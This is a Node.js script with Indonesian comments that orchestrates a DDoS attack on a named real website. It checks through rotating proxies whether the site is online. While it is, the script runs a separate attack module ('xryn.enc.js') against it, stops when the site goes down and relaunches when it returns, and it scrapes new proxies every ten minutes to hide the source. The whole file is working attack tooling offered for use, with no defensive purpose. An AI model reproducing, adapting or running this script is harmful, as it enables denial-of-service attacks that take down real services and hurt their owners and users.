const axios = require('axios'); // Untuk cek status target
const { spawn } = require('child_process'); // Untuk jalankan attack
const { ProxyAgent } = require('proxy-agent'); // Fix ProxyAgent import
const fs = require('fs');
const scrapeProxies = require('./proxy.js'); // Import fungsi scraping proxy

// Configurasi target dan interval cek
const target = 'https://thailandvacation.co.il/'; // Ganti dengan target lo
const intervalCheck = 7000; // Cek status setiap 7 detik
const proxyUpdateInterval = 10 * 60 * 1000; // 10 menit dalam milidetik
let attackProcess = null;

// Load proxy dari proxy.txt
function loadProxies() {
    const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
    return proxies;
}

// Fungsi cek apakah target online
async function isTargetUp() {
    try {
        const proxies = loadProxies();
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const agent = new ProxyAgent(proxy); // Proper constructor usage

        const response = await axios.get(target, { httpAgent: agent, timeout: 9000 });
        return response.status === 200;
    } catch (error) {
        console.log(`[INFO] Target mungkin offline. Error: ${error.message}`);
        return false;
    }
}

// Mulai serangan
function startAttack() {
    console.log('[INFO] Target online! Mulai serangan...');
    attackProcess = spawn('node', ['methods/xryn.enc.js', target, '60', '100', '10', 'proxy.txt'], {
        stdio: 'inherit', // Biar langsung keliatan outputnya di terminal
        shell: true, // Tambahan buat Windows compatibility
    });

    attackProcess.on('close', (code) => console.log(`[INFO] Serangan berhenti dengan kode ${code}`));
}

// Stop serangan
function stopAttack() {
    if (attackProcess) {
        console.log('[INFO] Stop serangan. Menunggu target kembali online...');
        attackProcess.kill();
        attackProcess = null;
    }
}

// Looping cek status dan serangan
async function holdDDoS() {
    const isUp = await isTargetUp();
    if (isUp) {
        if (!attackProcess) startAttack();
    } else {
        stopAttack();
    }
    setTimeout(holdDDoS, intervalCheck);
}

// Fungsi untuk scrape proxy setiap 10 menit
async function updateProxies() {
    console.log('[INFO] Scraping proxies baru...');
    try {
        await scrapeProxies(); // Panggil fungsi scraping dari proxy.js
        console.log('[INFO] Proxy berhasil diupdate.');
    } catch (error) {
        console.error(`[ERROR] Gagal update proxy: ${error.message}`);
    }
    setTimeout(updateProxies, proxyUpdateInterval);
}

// Jalankan script
console.log('[INFO] Mulai monitoring...');
holdDDoS();
updateProxies(); // Mulai update proxy otomatis